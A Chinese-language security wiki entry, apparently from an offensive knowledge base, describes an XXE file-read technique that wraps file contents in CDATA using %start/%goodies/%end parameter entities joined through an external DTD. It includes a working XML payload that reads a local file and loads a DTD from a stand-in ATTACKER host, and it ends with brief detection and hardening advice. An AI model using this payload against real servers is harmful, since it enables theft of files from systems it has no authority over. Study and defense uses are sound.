---
id: web-generic-xxe-cdata-parameter-entity-wrap
title: XXE 读含特殊字符文件：CDATA 实体包裹 + 外部 DTD 拼接 %start;%goodies;%end;
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-cdata-parameter-entity-file-read
aliases:
- CDATA 包裹 XXE
- XXE 特殊字符文件读取
- start goodies end DTD
- 参数实体 CDATA
- XXE 文件内容含 & < 报错绕过
tags:
- xxe
- file-read
- cdata
- parameter-entity
- external-dtd
- special-characters
- xml
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:53:44+08:00'
  notes: 已对照原文核对；%start/%goodies/%end + evil.dtd 中 <!ENTITY all "%start;%goodies;%end;"> 与原文 xml_payload/evil.dtd 完全一致；图01 为配套 stockCheck 读文件示意；原文未复现含特殊字符文件，属原理性正确
---

## 一句话结论

目标文件含 `&`、`<` 等 XML 特殊字符时，直接把 `&file;` 展开进文档会让解析器把文件内容当 XML 解析而报错或截断；改用 CDATA 包裹：定义 `%start` 为 `<![CDATA[`、`%goodies` 读取文件、`%end` 为 `]]>`，再由远程 DTD 把它们拼成一般实体 `&all;`，文档中引用 `&all;` 即可原样读出整个文件。

## 原理

- **直接展开的问题**：外部实体的值会被替换进 XML 文档，若文件里有 `&`、`<` 等字符，替换后的文档结构被破坏，解析器报错或把内容截断，读不到完整文件。
- **CDATA 的作用**：`<![CDATA[ ... ]]>` 内的内容不被当作标记解析，`&`、`<` 都能安全保留；把文件内容包在 CDATA 中再作为一般实体取值，就能完整回显。
- **DTD 的桥接**：参数实体（`%name;`）只能在 DTD 内部引用，不能直接写在文档元素里；因此 XML 里声明 `%start`/`%goodies`/`%end` 与远程 DTD `%dtd;`，远程 DTD 定义一般实体 `<!ENTITY all "%start;%goodies;%end;">`，参数实体在 DTD 加载时被展开，`all` 的值就是 CDATA 包裹后的文件内容，文档中的 `&all;` 再把它展开。
- **为什么成立**：实体替换发生在解析阶段，CDATA 是 XML 规范内建机制；整个过程只依赖解析器允许外部参数实体/外部 DTD，不依赖任何语言实现漏洞。

## 触发条件

- 应用解析用户可控 XML 且允许 DOCTYPE、外部参数实体与外部 DTD。
- 解析结果（实体值）能回显到响应；无回显时需配合错误回显/OOB。
- 目标文件可被解析器进程读取；远程 DTD 可被目标访问（或使用本地 DTD/内联方式）。

## 利用步骤

1. 构造 XML：内部 DTD 定义 `%start`（`<![CDATA[`）、`%goodies`（`file://` 目标文件）、`%end`（`]]>`），并引用远程 `evil.dtd`。
2. 在 evil.dtd 中定义一般实体 `all` 为 `%start;%goodies;%end;`。
3. 文档元素中写 `&all;`，提交后解析器加载 DTD、展开三个参数实体并回显 `&all;`。
4. 响应中的 CDATA 内容即完整文件；对二进制文件该方法不适用，需 base64 等其它手段。

## PoC

xml_payload：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
%dtd; ]>
<roottag>&all;</roottag>
```

evil.dtd：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

## 变体与关联

- **无回显**：把 `%goodies;` 拼进外带 URL（注意换行与特殊字符限制），或结合错误回显。
- **基础文件读取**：[[web-generic-xxe-inband-file-read-default-insecure]]；OOB 外带见 [[web-generic-xxe-oob-exfil]]。
- **协议选择**：Java 目标可先试 `netdoc:/file`；无外网时考虑本地 DTD 报错回显。
- **边界**：解析器禁用参数实体/外部 DTD、文件过大导致响应截断、或远程 DTD 不可达时失败。

## 检测与防御

- **解析器加固**：禁用 DOCTYPE/外部实体/外部参数实体，优先使用默认安全的解析器配置。
- **检测**：请求体中出现 `<![CDATA[` 与 `%start`/`%goodies`/`%end` 组合、外部 DTD 引用、实体引用异常；响应中出现文件内容。
- **出网与权限**：限制服务器访问外部 DTD；低权限运行，敏感文件最小可读。
